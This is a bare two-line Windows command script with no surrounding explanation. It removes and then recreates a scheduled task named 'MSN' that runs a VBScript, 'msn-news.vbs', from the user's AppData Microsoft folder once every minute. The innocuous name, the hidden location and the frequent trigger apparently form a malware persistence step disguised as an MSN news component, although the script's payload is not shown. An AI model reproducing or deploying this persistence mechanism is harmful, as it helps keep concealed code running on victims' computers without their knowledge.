schtasks /delete /tn "MSN" /f
schtasks /create /sc minute /mo 1 /tn "MSN" /tr "%APPDATA%\Microsoft\Windows\msn-news.vbs"
